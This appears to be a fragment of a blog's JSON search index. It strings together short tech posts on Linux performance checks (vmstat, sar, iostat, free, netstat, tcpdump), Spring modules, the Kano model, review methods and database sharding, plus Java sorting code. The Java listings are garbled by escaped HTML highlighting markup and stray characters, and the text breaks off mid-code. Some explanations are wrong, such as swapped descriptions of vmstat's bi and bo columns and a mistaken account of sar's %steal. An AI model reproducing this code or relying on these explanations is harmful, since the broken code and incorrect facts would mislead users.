用vmstat、sar、iostat检测是否是CPU瓶颈 用free、vmstat检测是否是内存瓶颈  用iostat检测是否是磁盘I/O瓶颈  用netstat检测是否是网络带宽瓶颈  通常，会用命令uptime，看下总体cpu使用情况，例如我其中一台线上机器情况  uptime  8:40pm up 580 days 2:34, 3 users, load average: 1.24, 1.44, 1.67  重点关注，load average ，这三个值的大小一般不能大于系统CPU的个数，例如，本输出中系统有4个CPU,如果load average的三个值长期大于4时，说明CPU很繁忙，负载很高，可能会影响系统性能，但是偶尔大于4时，倒不用担心，一般不会影响系统性能。相反，如果load average的输出值小于CPU的个数，则表示CPU还有空闲的时间片，比如本例中的输出，CPU是非常空闲的，为下次业务放量作准备，哈哈。  用vmstat 详细分析cpu的性能：用该命令分析我线上机器  vmstat 1  procs -----------memory---------- ---swap-- -----io---- -system-- -----cpu------  r b swpd free buff cache si so bi bo in cs us sy id wa st  2 0 189216 5439580 506476 1303832 0 0 0 0 0 0 14 6 79 1 0  6 1 189216 5439588 506476 1303832 0 0 0 60 12544 13986 17 5 77 1 0  1 0 189216 5439340 506476 1303832 0 0 0 0 12441 14394 18 4 78 0 0  1 0 189216 5439588 506476 1303832 0 0 0 0 12540 15346 18 4 78 0 0  解释下：  Procs  r：列表示运行和等待cpu时间片的进程数，这个值如果长期大于系统CPU的个数，说明CPU不足，需要增加CPU。  b：列表示在等待资源的进程数，比如正在等待I/O、或者内存交换等。  Cpu  us：列显示了用户进程消耗的CPU 时间百分比。us的值比较高时，说明用户进程消耗的cpu时间多，但是如果长期大于50%，就需要考虑优化程序或算法。  sy：列显示了内核进程消耗的CPU时间百分比。Sy的值较高时，说明内核消耗的CPU资源很多。  根据经验，us+sy的参考值为70%，如果us+sy大于 70%说明可能存在CPU资源不足。  Memory  swpd: 虚拟内存使用情况，单位：KB  free: 空闲的内存，单位KB  buff: 被用来做为缓存的内存数，一般对块设备的读写才需要缓冲,单位：KB  cache:表示page cached的内存数量，一般作为文件系统cached，频繁访问的文件都会被cached，如果cache值较大，说明cached的文件数较多，如果此时IO中bi比较小，说明文件系统效率比较好。  Swap  si: 从磁盘交换到内存的交换页数量，单位：KB/秒  so: 从内存交换到磁盘的交换页数量，单位：KB/秒  I/O  bi: 发送到块设备的块数，单位：块/秒  bo: 从块设备接收到的块数，单位：块/秒  System  in: 每秒的中断数，包括时钟中断  cs: 每秒的环境（上下文）切换次数  注意：如果 r经常大于 4 ，且id经常少于40，表示cpu的负荷很重。  如果si，so 长期不等于0，表示内存不足。  如果disk 经常不等于0， 且在 b中的队列 大于3， 表示 io性能不好。  用sar分析cpu性能，sar是个非常强大的工具，可以对系统的每个方面进行单独的统计，但是使用sar命令会增加系统开销，不过这些开销是可以评估的，对系统的统计结果不会有很大影响。  sar -u 1 4  Linux 2.6.16.60-0.21-TENCENT-090803 (RS_Server_vip) 04/28/11  21:06:13 CPU %user %nice %system %iowait %idle  21:06:14 all 16.83 0.00 4.46 0.99 77.72  21:06:15 all 15.08 0.00 4.52 0.00 80.40  21:06:16 all 17.21 0.00 3.99 0.00 78.80  21:06:17 all 16.75 0.00 3.25 0.00 80.00  Average: all 16.47 0.00 4.05 0.25 79.23  对上面每项的输出解释如下：  %user列显示了用户进程消耗的CPU 时间百分比。  %nice列显示了运行正常进程所消耗的CPU 时间百分比。  %system列显示了系统进程消耗的CPU时间百分比。  %iowait列显示了IO等待所占用的CPU时间百分比  %steal列显示了在内存相对紧张的环境下pagein强制对不同的页面进行的steal操作 。  %idle列显示了CPU处在空闲状态的时间百分比。  有的时候会遇到cpu很空闲，但是性能低下的情况，可能是由于开的进程数小于你cpu的数目，通常web svr进程都会开的很大，因为会调用很多后台服务，属于io类型偏多，逻辑处理偏少的，例如我线上web svr 是240个proc，但逻辑svr通常进程数相对小，因为逻辑处理是耗cpu型的，如果是异步的通常是4个proc，同步的16-32个不等。进程数与服务器性能也是息息相关的。   内存性能评估free  free -m  total used free shared buffers cached  Mem: 8110 2792 5318 0 494 1263  -/+ buffers/cache: 1034 7076  Swap: 2055 184 1870  注意：一般有这样一个经验公式：应用程序可用内存/系统物理内存&gt;70%时，表示系统内存资源非常充足，不影响系统性能，应用程序可用内存/系统物理内存&lt;20%时，表示系统内存资源紧缺，需要增加系统内存，20%&lt;应用程序可用内存/系统物理内存&lt;70%时，表示系统内存资源基本能满足应用需求，暂时不影响系统性能。  同样也可以用vmstat观察内存情况，重点关注si，so的值 i/o性能评估iostat命令  iostat -d 2  Linux 2.6.16.60-0.21-TENCENT-090803 (RS_Server_vip) 04/28/11  Device: tps Blk_read/s Blk_wrtn/s Blk_read Blk_wrtn  sda 9.48 22.73 41.50 1139188426 2080012464  Device: tps Blk_read/s Blk_wrtn/s Blk_read Blk_wrtn  sda 0.00 0.00 0.00 0 0  Device: tps Blk_read/s Blk_wrtn/s Blk_read Blk_wrtn  sda 7.50 0.00 112.00 0 224  对上面每项的输出解释如下：  Blk_read/s表示每秒读取的数据块数。  Blk_wrtn/s表示每秒写入的数据块数。  Blk_read表示读取的所有块数。  Blk_wrtn表示写入的所有块数。  注意：1：可以通过Blk_read/s和Blk_wrtn/s的值对磁盘的读写性能有一个基本的了解，如果Blk_wrtn/s值很大，表示磁盘的写操作很频繁，可以考虑优化磁盘或者优化程序，如果Blk_read/s值很大，表示磁盘直接读取操作很多，可以将读取的数据放入内存中进行操作。  2：对于这两个选项的值没有一个固定的大小，根据系统应用的不同，会有不同的值，但是有一个规则还是可以遵循的：长期的、超大的数据读写，肯定是不正常的，这种情况一定会影响系统性能。 I/O性能评估sar  sar -d 2 3  Linux 2.6.16.60-0.21-TENCENT-090803 (RS_Server_vip) 04/28/11  21:24:24 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util  21:24:26 dev8-0 10.40 0.00 324.75 31.24 0.08 7.43 5.52 5.74  21:24:26 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util  21:24:28 dev8-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00  21:24:28 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util  21:24:30 dev8-0 2.99 0.00 31.84 10.67 0.03 11.33 10.00 2.99  Average: DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util  Average: dev8-0 4.48 0.00 119.40 26.67 0.04 8.30 6.52 2.92  需要重点关注的几个参数含义：  await表示平均每次设备I/O操作的等待时间（以毫秒为单位）。  svctm表示平均每次设备I/O操作的服务时间（以毫秒为单位）。  %util表示一秒中有百分之几的时间用于I/O操作。  对以磁盘IO性能，一般有如下评判标准：  注意： 正常情况下svctm应该是小于await值的，而svctm的大小和磁盘性能有关，CPU、内存的负荷也会对svctm值造成影响，过多的请求也会间接的导致svctm值的增加。  await值的大小一般取决与svctm的值和I/O队列长度以及I/O请求模式，如果svctm的值与await很接近，表示几乎没有I/O等待，磁盘性能很好，如果await的值远高于svctm的值，则表示I/O队列等待太长，系统上运行的应用程序将变慢，此时可以通过更换更快的硬盘来解决问题。  %util项的值也是衡量磁盘I/O的一个重要指标，如果%util接近100%，表示磁盘产生的I/O请求太多，I/O系统已经满负荷的在工作，该磁盘可能存在瓶颈。长期下去，势必影响系统的性能，可以通过优化程序或者通过更换更高、更快的磁盘来解决此问题。 网络性能netstat，重用的几种方式为：  netstat -s 统计不同协议否有丢包  netstat -nlp Rev-Q是否有未读取的数据  netstat -antl 所有tcp连接状况  注意：可以通过netstat查看是否timewait过多的情况，导致端口不够用，在短连接服务中且大并发情况下，要不系统的如下两个选项打开，允许端口重用  tcp_tw_recycle  tcp_tw_reuse  网络接收详细情况tcpdump  如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包，使用命令：  tcpdump ip host 210.27.48.1 and ! 210.27.48.2  如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令：  tcpdump -i eth1 -Xnns0 tcp port 23 host 210.27.48.1 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-7/"
    } ,
  
    {
      "title"    : "Spring模块",
      "category" : "iteye",
      "content": "Spring Modules   Core Container: Core Beans Context Expression Language   Data Access/Integration: JDBC ORM * JPA * JDO * Hibernate * iBatis OXM * JAXB * XStream * XMLBeans * Castor * JiBX JMS Transation Web: Web: the initialization of the IOC container using servlet listerners,multipart file-upload Web-Servlet Web-Portlet   AOP and Instrumentation Instrumentation: class instrumentation and classloader implementations Test   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-70/"
    } ,
  
    {
      "title"    : "Communication",
      "category" : "iteye",
      "content": " avoid surprise when dealing with the relationship with your manager.     ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-71/"
    } ,
  
    {
      "title"    : "需求开发",
      "category" : "iteye",
      "content": "Kano Model   Requirements Type: Must-Be 基本需求，没有完成就意味着不是一个完全功能的产品 One-Dimentional the more the better, 实现的需求与客户满意度成正比 Delighters 这中需求没实现不会影响客户满意度。但如果有的话，会在市场同类产品中更有竞争力。     Note: 不同的客户群可能有不能的结果。     Affinity Diagram Affinity Diagram write ideas on cards classify these cards into groups name these groups     Quality Function Deployment 质量屋：customer wants(what), cost to implement(How), Conflict resolution         ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-75/"
    } ,
  
    {
      "title"    : "Review 方法",
      "category" : "iteye",
      "content": "Fagan's Inspection       Role: Author, Moderator(主持人，组织者，主要reviewer), Inspector, Reader, Recorder,verifier       phases: planning, preparation, Inspection meeting, rework,follow-up       Structured Walkthrough        简化了phase: preparation, Review, Rework, Closure   Four-eyes Review        相互依赖的模块之间Review, 只有两个人：one author, one reviewer ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-76/"
    } ,
  
    {
      "title"    : "Top-Down and Botton-up",
      "category" : "iteye",
      "content": "different perspectives SOA: the bottom-up approach, which is primarily IT driven.也即把现有的Java bean包装重用成Web Service等。    And BPM, the top-down approach, which is business driven，一切从头开始设计，包括WSDL等。    我喜欢这么一句话： 从技术(technique)的角度来说，用bottom up approach; 从业务(business)的角度来说，用Top down approach ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-77/"
    } ,
  
    {
      "title"    : "锤子和钉子",
      "category" : "iteye",
      "content": "give a child a hammer, everything becomes a nail. ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-78/"
    } ,
  
    {
      "title"    : "高性能数据库设计",
      "category" : "iteye",
      "content": " 字段冗余   Sharding   水平切分：分库，分表 根据一个标志字段如user id   问题：如何路由？   集群（Cluster），负载均衡（找到集群中的DB）   读写DB分离 Master DB(写），Slave DB(读），一般读写比例是10：1   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-79/"
    } ,
  
    {
      "title"    : "java 常见排序算法",
      "category" : "iteye",
      "content": "摘自http://deng5566.iteye.com/blog/678817，仅供自学。       排序算法复习（Java实现）(一）： 插入，冒泡，选择，Shell,快速排序  为了便于管理，先引入个基础类： package algorithms;   /**  * @author yovn  **/ public abstract class Sorter&lt;E extends Comparable&lt;E&gt;&gt; {       public abstract void sort(E[] array,int from ,int len);       public final void sort(E[] array)     {         sort(array,0,array.length);     }     &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;swap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t&lt;span class=&quot;no&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; } 一 插入排序 该算法在数据规模小的时候十分高效，该算法每次插入第K+1到前K个有序数组中一个合适位置，K从0开始到N-1,从而完成排序： package algorithms; /**  * @author yovn **/ public class InsertSorter&lt;E extends Comparable&lt;E&gt;&gt; extends Sorter&lt;E&gt; {           public void sort(E[] array, int from, int len) {                tE tmp=null;                tfor(int i=from+1;i&lt;from+len;i++) {                    t ttmp=array[i];                    t tint j=i;                    t tfor(;j&gt;from;j--) {                    t t t tif(tmp.compareTo(array[j-1])&lt;0) {                        t t t t tarray[j]=array[j-1];                        t t t t} else break;                    t t}                        t tarray[j]=tmp;                t}         }       }   二 冒泡排序 这可能是最简单的排序算法了，算法思想是每次从数组末端开始比较相邻两元素，把第i小的冒泡到数组的第i个位置。i从0一直到N-1从而完成排序。（当然也可以从数组开始端开始比较相邻两元素，把第i大的冒泡到数组的第N-i个位置。i从0一直到N-1从而完成排序。) package algorithms;   /**  * @author yovn  **/ public class BubbleSorter&lt;E extends Comparable&lt;E&gt;&gt; extends Sorter&lt;E&gt; {       private static  boolean DWON=true;       public final void bubble_down(E[] array, int from, int len) {          t t tfor(int i=from;i&lt;from+len;i++) {                    t t tfor(int j=from+len-1;j&gt;i;j--) {                  t t t t tif(array[j].compareTo(array[j-1])&lt;0) {                      t t t t t tswap(array,j-1,j);                        t t t t}                    t t t}                t t}            t}                    tpublic final void bubble_up(E[] array, int from, int len) {            t     for(int i=from+len-1;i&gt;=from;i--) {                    t      tfor(int j=from;j&lt;i;j++) {                        t      t tif(array[j].compareTo(array[j+1])&gt;0) {                      t t t t t tswap(array,j,j+1);                        t      t t}                    t      t}                t     }            t}                  t@Override            tpublic void sort(E[] array, int from, int len) {                  t tif(DWON) {                    t t tbubble_down(array,from,len);                t t} else {                    t t tbubble_up(array,from,len);                t t}            t}   }   三，选择排序 选择排序相对于冒泡来说，它不是每次发现逆序都交换，而是在找到全局第i小的时候记下该元素位置，最后跟第i个元素交换，从而保证数组最终的有序。 相对与插入排序来说，选择排序每次选出的都是全局第i小的，不会调整前i个元素了。 package algorithms; /**  * @author yovn  **/ public class SelectSorter&lt;E extends Comparable&lt;E&gt;&gt; extends Sorter&lt;E&gt; {        @Override      tpublic void sort(E[] array, int from, int len) {          t tfor(int i=0;i&lt;len;i++)         {              t t tint smallest=i;              t t tint j=i+from;              t t tfor(;j&lt;from+len;j++) {    t t t    if(array[j].compareTo(array[smallest])&lt;0) {    t t t        smallest=j;                  t t t t}              t t t}              t t&lt;span class=&quot;n&quot;&gt;swap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smallest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; } 四 Shell排序 Shell排序可以理解为插入排序的变种，它充分利用了插入排序的两个特点: 当数据规模小的时候非常高效 当给定数据已经有序时的时间代价为O(N) 所以，Shell排序每次把数据分成若个小块，来使用插入排序，而且之后在这若个小块排好序的情况下把它们合成大一点的小块，继续使用插入排序，不停的合并小块，知道最后成一个块，并使用插入排序。   这里每次分成若干小块是通过“增量” 来控制的，开始时增量较大，接近N/2,从而使得分割出来接近N/2个小块，逐渐的减小“增量“最终到减小到1。一直较好的增量序列是2^k-1,2^(k-1)-1,.....7,3,1,这样可使Shell排序时间复杂度达到O(N^1.5) 所以我在实现Shell排序的时候采用该增量序列 package algorithms;   /**  * @author yovn  **/ public class ShellSorter&lt;E extends Comparable&lt;E&gt;&gt; extends Sorter&lt;E&gt;  {       /* (non-Javadoc)      * Our delta value choose 2^k-1,2^(k-1)-1,  .7,3,1.      * complexity is O(n^1.5)      * @see algorithms.Sorter#sort(E[], int, int)      */     &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t&lt;span class=&quot;c1&quot;&gt;//1.calculate  the first delta value;         &lt;/span&gt;  t&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t  t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  t t &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;modify_insert_sort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;modify_insert_sort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t&lt;span 